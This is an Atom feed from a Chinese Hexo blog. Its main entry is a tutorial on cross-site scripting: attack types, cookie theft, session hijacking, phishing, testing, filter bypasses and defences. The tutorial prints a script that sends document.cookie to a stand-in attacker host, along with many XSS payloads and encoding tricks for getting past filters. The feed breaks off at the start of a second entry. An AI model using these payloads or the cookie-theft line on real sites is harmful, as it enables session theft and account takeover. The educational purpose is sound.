<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>自留地</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-27T07:45:39.179Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>fkrvro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS漏洞</title>
    <link href="http://yoursite.com/2020/02/27/XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/02/27/XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-27T04:41:38.000Z</published>
    <updated>2020-02-27T07:45:39.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss的成因"><a href="#xss的成因" class="headerlink" title="xss的成因"></a>xss的成因</h1><ul><li>XSS (Cross Site Script)，跨站脚本攻击。它是指恶意攻击者往web页面里插入html代码，当用户浏览该页时，嵌入其中的html代码会被执行，从而达成恶意用户的特殊目的。</li></ul><h1 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h1><ul><li>XSS攻击的危害包括：</li></ul><ol><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ol><h1 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a>XSS攻击类型</h1><ol><li><p>XSS可以分为两种类型：</p><ul><li>持久型和非持久型</li></ul></li><li><p>根据数据流向又可以分为三种攻击类型：</p><ul><li><p>反射型XSS攻击(反射型数据流向是：浏览器——&gt;后端——&gt;浏览器)</p><blockquote><p>在反射型 XSS 中，payload 一般存在于网页的 Url中，只用户单击时触发，只执行一次，非持久化，故称反射型 XSS。攻击者发送恶意 Url 链接让受害者点击(一般会对 payload 部分进行处理，如：编码转换和短域名跳转)</p></blockquote></li><li><p>存储型XSS攻击(存储型数据流向是：浏览器——&gt;后端——&gt;数据库——&gt;后端——&gt;浏览器)</p><blockquote><p>攻击者将代码通过表单提交的方式，将攻击代码写入数据库，当用户浏览页面的时候，数据库里的信息显示在页面，攻击代码执行，所有浏览到该页面数据的用户都会被XSS攻击</p></blockquote></li><li><p>DO2MBasedXSS（基于dom的跨站点脚本攻击）(DOM-XSS 的数据流向是：URL–&gt;浏览器 ,不需要后端服务器的参与)</p><blockquote><p>DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。</p></blockquote></li></ul></li></ol><h1 id="XSS-的利用方式"><a href="#XSS-的利用方式" class="headerlink" title="XSS 的利用方式"></a>XSS 的利用方式</h1><h2 id="Cookie-窃取"><a href="#Cookie-窃取" class="headerlink" title="Cookie 窃取"></a>Cookie 窃取</h2><p>Cookie 是 Web 系统识别用户的身份和保存会话状态的主要机制，且是由服务器生成、存储在客户端的一种数据。同时，对于 cookie 的操作十分的方便，我们可以通过 Document 对象访问 Cookie。如：<code>alert(document.cookie)</code>会弹出当前页面的 cookie 信息。</p><h3 id="关于cookie窃取的基础"><a href="#关于cookie窃取的基础" class="headerlink" title="关于cookie窃取的基础"></a>关于cookie窃取的基础</h3><ol><li><p>同源策略，即同端口同域名同协议。同源策略存在的意义就是为了保护用户的信息的安全，除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：  </p><ul><li>无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB  </li><li>无法读写非同源网页的 DOM  </li><li>无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝响应而报错）</li></ul></li><li><p>Cookie常见属性</p><ul><li>Domain————设置关联 Cookie 的域名;</li><li>Expires————通过给定一个过期时间来创建一个持久化 Cookie;</li><li>Httponly————用于避免 Cookie 被 Javascript 访问;</li><li>Name————Cookie 的名称;</li><li>Path————关联到 Cookie 的路径，默认为 /;</li><li>Value————读写 Cookie 的值;</li><li>Secure————用于指定 Cookie 需要通过安全 Socket 层传递连接;  </li></ul></li></ol><ol start="3"><li><p>Cookie安装类型分类</p><ul><li><p>本地 Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在</p></li><li><p>内存 Cookie————即储存在内存中，随浏览器的关闭而消失; </p><blockquote><p>区分方法：只要判断 cookie 中的 expires 即过期时间属性有没有设置，如果设置了即为本地 cookie，反之为内存 cookie。 </p></blockquote></li></ul></li></ol><h3 id="Cookie-盗取方式"><a href="#Cookie-盗取方式" class="headerlink" title="Cookie 盗取方式"></a>Cookie 盗取方式</h3><ol><li><p>默认情况</p><p>默认情况，即不对 Cookie 的任何属性进行指定就设置 Cookie 的情况。这种情况下 Cookie 的获取最为简单。可以通过下列方式获取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">newImage().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>不同域</p><p>这是由于 domain 字段的机制导致的。一个 Cookie 如果不知道 domain 的值，则默认为<strong>本域</strong>。  </p><p>例如有两个网站<code>www.a.com</code>和<code>test.a.com</code>且后者存在 xss 漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从<code>test.a.com</code>获取到<code>www.a.com</code>的 Cookie，可是如果<code>www.a.com</code>的 Cookie 值中的 domain 属性设置为父级域即<code>a.com</code>，就可以通过<code>test.a.com</code>的 xss 漏洞获取到<code>www.a.com</code>的 Cookie值。</p></li><li><h5 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h5><p>这是由于 path 字段的机制导致的。在设置 Cookie 时，如果不指定 path 的值，默认就是目标页面的路径。比如在<code>www.a.com/admin/index.php</code>设置 cookie 值且不知道 path，那么 path 默认为<code>/admin/</code>。javascript 可以指定任意路径的 cookie，但是只有对于 path 值的目录下才能读取 Cookie, 即上述例子中只有<code>/admin/</code>目录下的 javascipt 才能读取前边设置的 Cookie。</p></li><li><h5 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h5><p>HttpOnly 是指仅在 Http 层面上传输的 Cookie，当设置了 HttpOnly 标志后，客户端脚本就无法读取该 Cookie，这样做能有效防御 XSS 攻击获取 Cookie，也是目前防御 XSS 的主流手段之一。不过利用某些特定方式也可以同样读取到标志了 HttpOnly 的 Cookie。  </p><ul><li><p>利用调试信息，如：PHP 的 phpinfo() 和 Django 的调试信息，里边都记录了 Cookie 的值，且标志了HttpOnly 的 Cookie 也同样可以获取到。</p></li><li><p>利用 Apache Http Server 400 错误暴露 HttpOnly Cookie 的特点。 </p></li></ul></li><li><h5 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h5><p>Secure 是指设置了 Secure 的 Cookie 尽在 HTTPS 层面上进行安全传输，如果请求是 HTTP 的，则不会带上改 Cookie，这样做的好处是可以降低 Cookie 对中间人攻击获取的风险，可通过默认情况下获取。</p></li><li><p>P3P</p><p>HTTP 响应头的 P3P 字段可以用于标识是否允许目标网站的 Cookie 被另一域通过加载目标网站而设置或发送，据说仅 IE 支持（17年）。  </p><p>我们来举个例子，在 A 域通过 iframe 等方式加载 B 域(此时也称 B 域为第三方域)，如果我们想通过 B 域来设置 A 域的Cookie，或加载 B 域时带上 B 域的 Cookie，这时就得涉及到 P3P。</p><h6 id="B-域设置-A-域-Cookie"><a href="#B-域设置-A-域-Cookie" class="headerlink" title="B 域设置 A 域 Cookie"></a>B 域设置 A 域 Cookie</h6><p>在 IE 下默认是不允许第三方域设置的的，除非 A 域在响应头带上 P3P 字段。当响应头头带上 P3P 后，IE 下第三方域即可进行对 A 域 Cookie 的设置，且设置的 Cookie 会带上 P3P 属性，一次生效，即使之后没有 P3P 头也有效。</p><h6 id="加载-B-域时-Cookie-传入问题"><a href="#加载-B-域时-Cookie-传入问题" class="headerlink" title="加载 B 域时 Cookie 传入问题"></a>加载 B 域时 Cookie 传入问题</h6><p>我们知道 Cookie 分为内存 Cookie 和本地 Cookie，当我们通过 A 域加载 B 域时，默认是带内存 Cookie 加载(如果无内存 Cookie 则不带)，而如果想要带本地 Cookie 加载，则本地 Cookie 必须带 P3P 属性。 </p></li></ol><h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><p>   由于 Cookie 的不安全性，开发者们开始使用一些更为安全的认证方式——Session。</p><p>   Session基础：</p><blockquote><p> Session 的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的 Session。Session 是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session 也就“消失”了。  </p></blockquote><blockquote><p>在 Session 机制中，客户端和服务端也有被其他人利用的可能。  </p></blockquote><blockquote><p>Session 和 Cookie 最大的区别在于：Session 是保存在服务端的内存里面，而 Cookie 保存于浏览器或客户端文件里面</p></blockquote><p>   会话劫持的实质就是模拟 GET/POST 请求(带 Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。  </p><p>   我们可以通过构造的 GET/POST 请求来实现如添加管理员、删除文章、上传文件等操作。XSS 蠕虫从某种意义上来说也属于会话劫持。</p><p>   如：</p><ul><li><p>通过 javascript 控制 DOM 对象来发起一个 GET 请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img&#x3D;document.creatElement(&quot;img&quot;);</span><br><span class="line">img.src&#x3D;&quot;http:&#x2F;&#x2F;www.a.com&#x2F;del.php?id&#x3D;1&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure></li><li><p>通过 javascript 自动构造隐藏表单并提交 (POST)</p></li><li><p>通过 XMLHttpRequest 直接发送一个 POST 请求</p></li></ul><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><ol><li><h5 id="XSS-重定向钓鱼"><a href="#XSS-重定向钓鱼" class="headerlink" title="XSS 重定向钓鱼"></a>XSS 重定向钓鱼</h5><p>即从<code>www.a.com</code>通过 xss 漏洞跳转到<code>www.b.com</code>的钓鱼页面上，整个过程变化明显，受害者易察觉。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.a.com&#x2F;index.php?search&#x3D;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.b.com&#x2F;index.php&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><h5 id="HTML-注入式钓鱼"><a href="#HTML-注入式钓鱼" class="headerlink" title="HTML 注入式钓鱼"></a>HTML 注入式钓鱼</h5><p>通过 javascript 来修改页面的 DOM 对象属性，或在原页面中添加新的 DOM 元素。前者相对于后者更隐蔽。</p></li><li><h5 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者通过 javascript 来添加一个新的&lt;Iframe&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</span><br></pre></td></tr></table></figure></li></ol><h1 id="XSS-漏洞的挖掘"><a href="#XSS-漏洞的挖掘" class="headerlink" title="XSS 漏洞的挖掘"></a>XSS 漏洞的挖掘</h1><p>XSS 漏洞的挖掘主要分为白盒审计和黑盒 Fuzz 两种。</p><h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><p>通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计。</p><blockquote><p>分析源代码挖掘 XSS 的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被 htmlencode() 之类的函数过滤</p></blockquote><h2 id="黑盒-Fuzz"><a href="#黑盒-Fuzz" class="headerlink" title="黑盒 Fuzz"></a>黑盒 Fuzz</h2><p>进行 XSS 黑盒测试时主要分为手工检测和工具检测。</p><h3 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h3><p>首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如<code>&quot;&lt;&gt;&amp;;/&#39;:</code>等，如果连<code>&lt;&gt;</code>都未过滤/转义，那么该输入点很可能存在 XSS 漏洞。</p><p>如果<code>&lt;&gt;</code>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href，lowsrc，bgsound，backgroud，value，action，dynsrc 等)来触发 XSS。</p><p>一般来说，针对输入框的黑盒测试可能存在反射型 XSS，也可能存在存储型 XSS，还有可能是 DOM 型，针对 Url 参数的黑盒测试绝大多数只存在反射型 XSS 或 DOM 型 XSS。</p><p>&lt;img&gt; 标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用方式1</span><br><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot;style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot;onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot;onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src&#x3D;1onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p>&lt;a&gt; 标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot;onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot;onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href&#x3D;&quot;&quot;onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000onmouseover&#x3D;prompt(&#39;xss&#39;)y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>input 标签:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot;value&#x3D;&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value&#x3D;&quot;&quot;onclick&#x3D;alert(&#39;xss&#39;)type&#x3D;&quot;text&quot;&gt;</span><br><span class="line"></span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot;value&#x3D;&quot;&quot;onmouseover&#x3D;prompt(&#39;xss&#39;)bad&#x3D;&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot;value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>form标签:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XSS利用方式1</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;form method&#x3D;postaction&#x3D;aa.asp?onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;postaction&#x3D;aa.asp?onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;postaction&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;postaction&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure><p>iframe标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">XSS利用方式1</span><br><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000&#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot;onmouseover&#x3D;alert(&#39;xss&#39;)&#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">   </span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p>svg标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h3><p>关于 XSS 的自动检测软件有许多，如 Burp 的 Scan 模块，BruteXSS:</p><blockquote><p><a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">https://github.com/rajeshmajumdar/BruteXSS</a></p></blockquote><h1 id="shellcode-的绕过"><a href="#shellcode-的绕过" class="headerlink" title="shellcode 的绕过"></a>shellcode 的绕过</h1><h2 id="绕过XSS-Filter"><a href="#绕过XSS-Filter" class="headerlink" title="绕过XSS-Filter"></a>绕过XSS-Filter</h2><p>XSS-Filter 是一段基于黑名单的过滤函数，大多数 CMS 都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于 XSS的多变性，几乎不可能存在完全地过滤。</p><ol><li><h5 id="空格回车和-Tab"><a href="#空格回车和-Tab" class="headerlink" title="空格回车和 Tab"></a>空格回车和 Tab</h5><p>对 XSS-Filter 而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab 等键位符来进行绕过。这是由于在 javascript 中只会将<code>;</code>作为语句的终止符，当浏览器引擎解析 javascript 脚本时没有匹配到<code>;</code>便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字<code>javascript|alert</code>的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;javasc</span><br><span class="line">ript:aler</span><br><span class="line">t(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure></li><li><h5 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h5><p>HTML 中属性值支持 ASCII 码形式，如  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>其中在 ASCII 表中 116 为<code>t</code>，58 为<code>:</code>。  </p><p>也可以将<code>&amp;#01</code>,<code>&amp;#02</code>等插入 javascript 的头部，还可以将 tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。</p></li><li><p>Fuzz 标签未过滤事件名</p><p>如&lt;img src=x onerror=alerr(/xss/)&gt;其中的 onerror 即为 IMG 标签的一个事件，通常这样的事件都是以<code>on</code>开头，常见的有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onReverse</span><br><span class="line">onSeek</span><br><span class="line">onSynchRestored</span><br><span class="line">onURLFlip</span><br><span class="line">onRepeat</span><br><span class="line">onPause</span><br><span class="line">onstop</span><br><span class="line">onmouseover</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>使用Css绕过</p><p>利用 Css 样式表可以执行 javascript 的特性，如  Css 直接执行 </p><p>javascript：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body&#123;background-image:url(&quot;javascript:alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>css 中使用 expression 执行 javascript:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot;style&#x3D;&quot;xss:expression(alert(&#x2F;xss&#x2F;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body&#123;background-image:expression(&quot;alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>在上述的两个例子中，都用到了样式表的 url 属性来执行 XSS 代码。  </p><p>除了上述两种，还可以利用 <code>@import</code> 直接执行 javascript 代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">@import&#39;javascript:alert(&quot;xss&quot;)&#39;;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>在现实环境下，HTML 页面中的 Css 与 Javascript 的嵌入方式很相似，且 Css 也可以执行 javascript 代码，故我们的 XSS 代码也可以通过嵌入远程恶意 css 文件来进行 XSS 攻击。</p></li></ol><ol start="5"><li><h4 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">大小写变换;</span><br><span class="line"></span><br><span class="line">利用 expression 执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;</span><br><span class="line"></span><br><span class="line">结合样式表注释字符 &#x2F;**&#x2F;，通过 css 执行 javascript</span><br><span class="line"></span><br><span class="line">样式标签会过滤\和\0，可以构造如@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;绕过</span><br><span class="line"></span><br><span class="line">Css 关键字进行编码处理，如&lt;p style&#x3D;&quot;xss:\0065xpression(alert(&#x2F;xss&#x2F;))&quot;&gt;其中 65 为字母 e 进行 unicode 编码后的数字部分</span><br><span class="line"></span><br><span class="line">利用浏览器解析注释的问题</span><br></pre></td></tr></table></figure></li><li><p>利用字符编码</p><p>javascript 支持许多的编码格式，如：</p><ul><li>unicode</li><li>escapes</li><li>十六|十|八进制  </li><li>在IE下甚至支持 JScript Encode 加密后的代码</li></ul></li></ol><h1 id="xss防范："><a href="#xss防范：" class="headerlink" title="xss防范："></a>xss防范：</h1><ul><li>XSS防御的总体思路是：对输入(和URL参数)进行过滤，对输出进行编码。</li></ul><ol><li>对输入和URL参数进行过滤(白名单和黑名单)</li><li>对输出进行编码</li><li>url属性过滤，确保：href 和 src 的值必须以 http://开头，白名单方式；不能有10进制和16进制编码字符。</li><li>设置HttpOnly，禁止js脚本读取cookie信息。、</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xss的成因&quot;&gt;&lt;a href=&quot;#xss的成因&quot; class=&quot;headerlink&quot; title=&quot;xss的成因&quot;&gt;&lt;/a&gt;xss的成因&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;XSS (Cross Site Script)，跨站脚本攻击。它是指恶意攻击者往web页面里插入
      
    
    </summary>
    
    
      <category term="漏洞详解" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
      <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>WAMP安装</title>
    <link href="http://yoursite.com/2020/02/26/WAMP%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2020/02/26/WAMP%E5%AE%89%E8%A3%85/</id>
    <published>2020-02-26T05:58:02.000Z</published>
